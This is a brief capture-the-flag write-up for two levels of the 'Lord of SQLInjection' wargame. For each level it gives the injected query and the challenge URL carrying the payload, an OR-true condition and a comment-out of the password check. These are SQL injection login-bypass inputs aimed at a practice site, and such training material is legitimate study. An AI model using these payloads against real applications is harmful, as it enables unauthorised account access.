# Lord of SQLInjection Write-ups

## gremlin

![gremlin](./pic/gremlin.PNG)

query: 
```SQL
select id from prob_gremlin where id='0'||1#' and pw=''
```

https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=0'||1%23

![gremlin](./pwned/gremlin.PNG)

<br>

## cobolt

![cobolt](./pic/cobolt.PNG)

query:
```SQL
select id from prob_cobolt where id='admin'#' and pw=md5('')
```
https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php?id=admin'%23

![cobolt](./pwned/cobolt.PNG)

<br>

